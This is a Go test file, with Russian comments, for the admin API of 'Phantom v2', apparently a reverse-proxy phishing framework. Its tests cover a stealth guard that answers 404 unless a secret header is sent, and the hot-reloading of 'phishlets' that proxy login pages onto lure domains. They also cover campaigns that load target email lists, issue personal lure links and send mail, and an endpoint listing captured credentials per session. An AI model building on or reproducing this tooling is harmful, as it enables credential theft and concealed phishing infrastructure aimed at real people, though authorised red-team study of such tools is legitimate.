package api

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/core/phishlet"
	"os"
	"path/filepath"
	"github.com/phantom-v2/phantom/internal/blocklist"
	"github.com/phantom-v2/phantom/internal/campaign"
	"github.com/phantom-v2/phantom/internal/lures"
	"github.com/phantom-v2/phantom/internal/mailer"
)

func testDeps() Deps {
	st := phishlet.NewStore()
	_ = st.LoadDir("../../configs/phishlets")
	return Deps{
		StealthHost: "api-internal.example.com",
		Store:       st,
		Blocked:     blocklist.New(),
		Lures:       lures.New(),
		StartedAt:   time.Now(),
	}
}

func TestStealthHeader(t *testing.T) {
	h := Handler(testDeps())
	// без заголовка — 404 (stealth)
	req := httptest.NewRequest("GET", "/api/v1/stats", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("expected stealth 404, got %d", rec.Code)
	}
	req2 := httptest.NewRequest("GET", "/api/v1/stats", nil)
	req2.Header.Set("X-Stealth-Host", "api-internal.example.com")
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, req2)
	if rec2.Code != 200 {
		t.Fatalf("expected 200, got %d", rec2.Code)
	}
	var stats map[string]any
	if err := json.NewDecoder(rec2.Body).Decode(&stats); err != nil {
		t.Fatal(err)
	}
}

func TestUIGating(t *testing.T) {
	h := Handler(testDeps())
	// loopback без stealth-хедера — UI отдается
	req := httptest.NewRequest("GET", "/ui/dashboard.html", nil)
	req.RemoteAddr = "127.0.0.1:1234"
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != 200 {
		t.Fatalf("loopback ui: %d", rec.Code)
	}
	// чужой хост/IP — 404
	req2 := httptest.NewRequest("GET", "/ui/dashboard.html", nil)
	req2.Host = "evil.example.com"
	req2.RemoteAddr = "8.8.8.8:1234"
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, req2)
	if rec2.Code != http.StatusNotFound {
		t.Fatalf("foreign ui: %d", rec2.Code)
	}
}

// /dashboard за тем же stealth-guard: без X-Stealth-Host — 404,
// с корректным хостом — 200 + html.
func TestDashboardStealth(t *testing.T) {	h := Handler(testDeps())

	req := httptest.NewRequest("GET", "/dashboard", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("expected stealth 404, got %d", rec.Code)
	}

	req2 := httptest.NewRequest("GET", "/dashboard", nil)
	req2.Header.Set("X-Stealth-Host", "api-internal.example.com")
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, req2)
	if rec2.Code != 200 {
		t.Fatalf("expected 200, got %d", rec2.Code)
	}
	if ct := rec2.Header().Get("Content-Type"); ct != "text/html; charset=utf-8" {
		t.Fatalf("dashboard must be html, got %q", ct)
	}
	if body := rec2.Body.String(); !strings.Contains(body, "Phantom v2") {
		t.Fatalf("dashboard body missing title, got %q", body)
	}
}

func withHooks(d Deps) Deps {	d.OnReload = func() error { return nil }
	d.OnUpsert = func(yml []byte) (string, error) {
		up, ok := d.Store.(interface {
			UpsertYAML([]byte) (*core.Phishlet, error)
		})
		if !ok {
			return "", errNoUpsert
		}
		p, err := up.UpsertYAML(yml)
		if err != nil {
			return "", err
		}
		return p.ID, nil
	}
	d.OnGenerate = func(origin, domain, id, sub, _ string) (string, error) {
		if sub == "" {
			sub = "gen"
		}
		return "id: " + id + "\norigin: " + origin + "\n", nil
	}
	return d
}

var errNoUpsert = errString("no upsert")

type errString string

func (e errString) Error() string { return string(e) }

func stealthReq(method, path, body string) *http.Request {
	var req *http.Request
	if body == "" {
		req = httptest.NewRequest(method, path, nil)
	} else {
		req = httptest.NewRequest(method, path, strings.NewReader(body))
	}
	req.Header.Set("X-Stealth-Host", "api-internal.example.com")
	return req
}

func TestHotReloadEndpoints(t *testing.T) {
	h := Handler(withHooks(testDeps()))
	// reload → 204
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, stealthReq(http.MethodPost, "/api/v1/phishlets/reload", ""))
	if rec.Code != http.StatusNoContent {
		t.Fatalf("reload: %d", rec.Code)
	}
	// upsert valid → 201
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, stealthReq(http.MethodPost, "/api/v1/phishlets",
		"id: hotapi\nversion: 2\nbase_domains: [\"a.test\"]\nproxy_hosts: [{phish_sub: \"l\", orig_sub: \"o\", domain: \"u.test\"}]\nlure_path: \"/l/hotapi\"\nenabled: true\n"))
	if rec2.Code != http.StatusCreated {
		t.Fatalf("upsert: %d %s", rec2.Code, rec2.Body.String())
	}
	// upsert garbage → 400, живой стор цел
	rec3 := httptest.NewRecorder()
	h.ServeHTTP(rec3, stealthReq(http.MethodPost, "/api/v1/phishlets", "id: [broken"))
	if rec3.Code != http.StatusBadRequest {
		t.Fatalf("bad upsert: %d", rec3.Code)
	}
	// generate → yaml
	rec4 := httptest.NewRecorder()
	h.ServeHTTP(rec4, stealthReq(http.MethodPost, "/api/v1/phishlets/generate",
		`{"origin":"login.x.com","domain":"p.test","id":"g1"}`))
	if rec4.Code != 200 || !strings.Contains(rec4.Body.String(), "g1") {
		t.Fatalf("generate: %d %s", rec4.Code, rec4.Body.String())
	}
}

func TestConfigEndpoint(t *testing.T) {
	d := testDeps()
	d.NodeID = "eu-1"
	d.Config = func() map[string]any { return map[string]any{"domains": []string{"a.test"}} }
	h := Handler(d)
	// без хедера — 404
	rec := httptest.NewRequest("GET", "/api/v1/config", nil)
	r0 := httptest.NewRecorder()
	h.ServeHTTP(r0, rec)
	if r0.Code != http.StatusNotFound {
		t.Fatalf("stealth: %d", r0.Code)
	}
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, stealthReq(http.MethodGet, "/api/v1/config", ""))
	if rec2.Code != 200 {
		t.Fatalf("config: %d", rec2.Code)
	}
	var out map[string]any
	if err := json.NewDecoder(rec2.Body).Decode(&out); err != nil {
		t.Fatal(err)
	}
	if out["node"] != "eu-1" || out["domains"] == nil {
		t.Fatalf("bad config: %v", out)
	}
}


func TestPhishletAdmin(t *testing.T) {
	d := testDeps()
	// hermetic: копия фишлета во временную dir, чтобы Save не трогал репозиторий
	tmp := t.TempDir()
	src, err := os.ReadFile("../../configs/phishlets/labtest.yaml")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(tmp, "labtest.yaml"), src, 0o600); err != nil {
		t.Fatal(err)
	}
	isolated := phishlet.NewStore()
	if err := isolated.LoadDir(tmp); err != nil {
		t.Fatal(err)
	}
	d.Store = isolated
	h := Handler(d)
	put := func(id, body string) *httptest.ResponseRecorder {
		req := stealthReq(http.MethodPut, "/api/v1/phishlets/"+id, body)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		return rec
	}
	// Смена домена labtest -> evil.test
	if rec := put("labtest", `{"domains":["evil.test"]}`); rec.Code != http.StatusNoContent {
		t.Fatalf("domains: %d %s", rec.Code, rec.Body.String())
	}
	st := d.Store.(*phishlet.Store)
	if ph, _ := st.FindByHost("login.evil.test"); ph == nil {
		t.Fatal("new domain not live")
	}
	// Выключение
	if rec := put("labtest", `{"enabled":false}`); rec.Code != http.StatusNoContent {
		t.Fatalf("disable: %d", rec.Code)
	}
	if ph, _ := st.FindByHost("login.evil.test"); ph != nil {
		t.Fatal("disabled must not resolve")
	}
	// Включение обратно
	if rec := put("labtest", `{"enabled":true}`); rec.Code != http.StatusNoContent {
		t.Fatalf("enable: %d", rec.Code)
	}
	// Мусор и неизвестный
	if rec := put("labtest", `{"domains":[]}`); rec.Code != http.StatusBadRequest {
		t.Fatalf("empty domains: %d", rec.Code)
	}
	if rec := put("nope", `{"enabled":true}`); rec.Code != http.StatusBadRequest {
		t.Fatalf("unknown: %d", rec.Code)
	}
	if rec := put("labtest", `{broken`); rec.Code != http.StatusBadRequest {
		t.Fatalf("bad json: %d", rec.Code)
	}
	// GET на admin-путь — 405
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, stealthReq(http.MethodGet, "/api/v1/phishlets/labtest", ""))
	if rec.Code != http.StatusMethodNotAllowed {
		t.Fatalf("get admin: %d", rec.Code)
	}
}

type memPresets struct{ m map[string]bool }

func newMemPresets() *memPresets { return &memPresets{m: map[string]bool{}} }

func (s *memPresets) AddDomainPreset(domain string) error {
	if domain == "" || len(domain) < 3 {
		return errString("bad")
	}
	s.m[domain] = true
	return nil
}

func (s *memPresets) ListDomainPresets() ([]string, error) {
	var out []string
	for k := range s.m {
		out = append(out, k)
	}
	return out, nil
}

func (s *memPresets) RemoveDomainPreset(domain string) error {
	delete(s.m, domain)
	return nil
}

func TestDetailAndDomains(t *testing.T) {
	d := testDeps()
	d.Presets = newMemPresets()
	h := Handler(d)
	// detail: id/enabled/domains
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, stealthReq(http.MethodGet, "/api/v1/phishlets/detail", ""))
	if rec.Code != 200 {
		t.Fatalf("detail: %d", rec.Code)
	}
	var rows []struct {
		ID      string
		Enabled bool
		Domains []string
	}
	if err := json.NewDecoder(rec.Body).Decode(&rows); err != nil || len(rows) == 0 {
		t.Fatalf("detail body: %v", err)
	}
	if rows[0].ID == "" || rows[0].Domains == nil {
		t.Fatalf("detail shape: %+v", rows[0])
	}
	// domains CRUD
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, stealthReq(http.MethodPost, "/api/v1/domains", `{"domain":"evil.test"}`))
	if rec2.Code != http.StatusCreated {
		t.Fatalf("add: %d", rec2.Code)
	}
	rec3 := httptest.NewRecorder()
	h.ServeHTTP(rec3, stealthReq(http.MethodGet, "/api/v1/domains", ""))
	if rec3.Code != 200 || !strings.Contains(rec3.Body.String(), "evil.test") {
		t.Fatalf("list: %d %s", rec3.Code, rec3.Body.String())
	}
	rec4 := httptest.NewRecorder()
	h.ServeHTTP(rec4, stealthReq(http.MethodDelete, "/api/v1/domains/evil.test", ""))
	if rec4.Code != http.StatusNoContent {
		t.Fatalf("del: %d", rec4.Code)
	}
	// без пресетов — 501
	d2 := testDeps()
	h2 := Handler(d2)
	rec5 := httptest.NewRecorder()
	h2.ServeHTTP(rec5, stealthReq(http.MethodGet, "/api/v1/domains", ""))
	if rec5.Code != http.StatusNotImplemented {
		t.Fatalf("no presets: %d", rec5.Code)
	}
}

func TestCampaignsAPI(t *testing.T) {
	d := testDeps()
	d.Presets = newMemPresets()
	cs := campaign.NewStore()
	ls := lures.New()
	svc := &campaign.Service{Campaigns: cs, Lures: ls, Mail: &mailer.Sender{}}
	d.Campaigns = svc
	h := Handler(d)
	post := func(path, body string) *httptest.ResponseRecorder {
		req := stealthReq(http.MethodPost, path, body)
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		return rec
	}
	// create
	rec := post("/api/v1/campaigns", `{"name":"op","phishlet_id":"labtest"}`)
	if rec.Code != http.StatusCreated {
		t.Fatalf("create: %d %s", rec.Code, rec.Body.String())
	}
	var created map[string]string
	if err := json.NewDecoder(rec.Body).Decode(&created); err != nil || created["id"] == "" {
		t.Fatalf("create body: %v", err)
	}
	id := created["id"]
	// targets
	rec2 := post("/api/v1/campaigns/"+id+"/targets", `{"emails":["a@x.com","bad","b@x.com"]}`)
	if rec2.Code != 200 || !strings.Contains(rec2.Body.String(), `"added":2`) {
		t.Fatalf("targets: %d %s", rec2.Code, rec2.Body.String())
	}
	// launch -> персональные lures
	rec3 := post("/api/v1/campaigns/"+id+"/launch", `{}`)
	if rec3.Code != 200 || !strings.Contains(rec3.Body.String(), "/l/") {
		t.Fatalf("launch: %d %s", rec3.Code, rec3.Body.String())
	}
	// list со статистикой
	rec4 := httptest.NewRecorder()
	h.ServeHTTP(rec4, stealthReq(http.MethodGet, "/api/v1/campaigns", ""))
	if rec4.Code != 200 || !strings.Contains(rec4.Body.String(), `"total":2`) {
		t.Fatalf("list: %d %s", rec4.Code, rec4.Body.String())
	}
	// send без SMTP: dry-run выключен по дефолту в нулевом Sender -> 400
	rec5 := post("/api/v1/campaigns/"+id+"/send", `{"subject":"hi","body":"x","url_base":"https://m.test"}`)
	if rec5.Code != http.StatusBadRequest {
		t.Fatalf("send no-smtp: %d", rec5.Code)
	}
	// неизвестная кампания
	rec6 := post("/api/v1/campaigns/nope/launch", `{}`)
	if rec6.Code != http.StatusBadRequest {
		t.Fatalf("unknown: %d", rec6.Code)
	}
	// без сервиса — 501
	d2 := testDeps()
	h2 := Handler(d2)
	rec7 := httptest.NewRecorder()
	h2.ServeHTTP(rec7, stealthReq(http.MethodGet, "/api/v1/campaigns", ""))
	if rec7.Code != http.StatusNotImplemented {
		t.Fatalf("disabled: %d", rec7.Code)
	}
}

func TestCheckAndCaptures(t *testing.T) {
	d := testDeps()
	d.Caps = func(limit int) ([]map[string]any, error) {
		return []map[string]any{{"session": "s1", "kind": "creds", "node": "n1"}}, nil
	}
	h := Handler(d)
	// captures
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, stealthReq(http.MethodGet, "/api/v1/captures?limit=5", ""))
	if rec.Code != 200 || !strings.Contains(rec.Body.String(), "creds") {
		t.Fatalf("captures: %d %s", rec.Code, rec.Body.String())
	}
	// captures без Caps — 501
	d2 := testDeps()
	h2 := Handler(d2)
	rec2 := httptest.NewRecorder()
	h2.ServeHTTP(rec2, stealthReq(http.MethodGet, "/api/v1/captures", ""))
	if rec2.Code != http.StatusNotImplemented {
		t.Fatalf("no caps: %d", rec2.Code)
	}
	// check неизвестного — 404
	rec3 := httptest.NewRecorder()
	h.ServeHTTP(rec3, stealthReq(http.MethodPost, "/api/v1/phishlets-check/nope", ""))
	if rec3.Code != http.StatusNotFound {
		t.Fatalf("unknown check: %d", rec3.Code)
	}
	// check GET — 405
	rec4 := httptest.NewRecorder()
	h.ServeHTTP(rec4, stealthReq(http.MethodGet, "/api/v1/phishlets-check/labtest", ""))
	if rec4.Code != http.StatusMethodNotAllowed {
		t.Fatalf("check method: %d", rec4.Code)
	}
}
